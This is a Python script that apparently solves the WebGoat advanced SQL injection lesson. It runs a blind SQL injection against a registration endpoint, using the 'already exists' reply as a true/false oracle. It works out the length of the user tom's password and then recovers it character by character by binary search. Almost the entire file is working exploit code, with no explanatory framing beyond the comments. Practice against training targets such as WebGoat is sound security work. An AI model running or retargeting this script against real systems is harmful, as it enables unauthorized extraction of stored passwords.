import requests
import urllib.parse
import sys


BASE_URL = "http://192.168.1.20:8080/WebGoat/SqlInjectionAdvanced/register"
# You must supply a valid JSESSIONID from your WebGoat login/session.
JSESSIONID = "011A9CE038B2DBB07EB7A8DAA9C8AD5C"  

# If your WebGoat instance is somewhere else, adjust BASE_URL accordingly.
# Also adjust MAX_PW_LEN if you expect a longer password.
MAX_PW_LEN = 50

# These parameters (email_reg, password_reg, confirm_password_reg) can be anything;
# they are only required to satisfy the “register” form. We leave them constant.
EMAIL_REG          = "attack@example.com"
PASSWORD_REG       = "irrelevant"
CONFIRM_PASSWORD   = "irrelevant"


def send_injection_payload(session, injection_condition: str) -> bool:
    """
    Sends a PUT request to WebGoat’s /SqlInjectionAdvanced/register endpoint,
    using `username_reg = tom' AND {injection_condition} --`.
    Returns True if the feedback says “already exists,” and False otherwise.
    """
    payload_username = f"tom' AND {injection_condition} --"
    form_data = {
        "username_reg":     payload_username,
        "email_reg":        EMAIL_REG,
        "password_reg":     PASSWORD_REG,
        "confirm_password_reg": CONFIRM_PASSWORD,
    }

    # URL‐encode form data
    encoded = urllib.parse.urlencode(form_data)
    headers = {
        "Content-Type": "application/x-www-form-urlencoded; charset=UTF-8",
        "Cookie":       f"JSESSIONID={JSESSIONID}",
        "Accept":       "application/json, text/javascript, */*; q=0.01",
        "X-Requested-With": "XMLHttpRequest",
    }

    r = session.put(BASE_URL, data=encoded, headers=headers)
    r.raise_for_status()
    j = r.json()

    feedback_text = j.get("feedback", "")
    # WebGoat returns “User tom' AND … already exists” if the condition is TRUE
    return ("already exists" in feedback_text)


def find_password_length(session) -> int:
    """
    Probes substring(password, pos, 1) != '' for pos = 1..MAX_PW_LEN.
    Stops when it returns False. Returns the discovered length.
    """
    print("[*] Determining password length…")
    for pos in range(1, MAX_PW_LEN + 1):
        condition = f"substring(password,{pos},1) != ''"
        exists = send_injection_payload(session, condition)
        sys.stdout.write(f"  pos {pos:>2} → non-empty? {exists}\r")
        sys.stdout.flush()
        if not exists:
            length = pos - 1
            print(f"\n[+] Password length determined: {length}")
            return length

    # If we never saw “False,” assume MAX_PW_LEN is correct
    print(f"\n[!] Reached MAX_PW_LEN ({MAX_PW_LEN}). Assuming length = {MAX_PW_LEN}.")
    return MAX_PW_LEN


def extract_char_at_pos(session, pos: int) -> str:
    """
    Uses a binary search over ASCII 32..126 to find the character at password[pos].
    Returns it as a single‐character string.
    """
    low = 32
    high = 126

    while low <= high:
        mid = (low + high) // 2
        mid_char = chr(mid)

        # Build condition: substring(password, pos, 1) > '{mid_char}'
        # Note: we compare as a single‐quoted literal. Make sure to escape single quotes if needed.
        condition = f"substring(password,{pos},1) > '{mid_char}'"
        is_greater = send_injection_payload(session, condition)

        if is_greater:
            # Real char > mid_char → go right
            low = mid + 1
        else:
            # Real char ≤ mid_char → go left
            high = mid - 1

    # After the loop, `low` is the smallest ASCII code such that the real character is ≤ low.
    # From the example, low will land exactly on the ASCII code of the real character.
    return chr(low)


def main():
    session = requests.Session()

    # Step 1: Determine the password length
    pw_len = find_password_length(session)

    # Step 2: For each position 1..pw_len, binary‐search the character
    discovered = []
    print("[*] Starting binary‐search extraction of each character:")
    for pos in range(1, pw_len + 1):
        print(f"  → Extracting position {pos} of {pw_len}…", end="", flush=True)
        ch = extract_char_at_pos(session, pos)
        discovered.append(ch)
        print(f" '{ch}'")

    password = "".join(discovered)
    print("\n[+] Extraction complete! Discovered password:  ", password)


if __name__ == "__main__":
    print("\n=== Blind SQL‐Injection Brute‐Forcer for WebGoat ===\n")
    main()
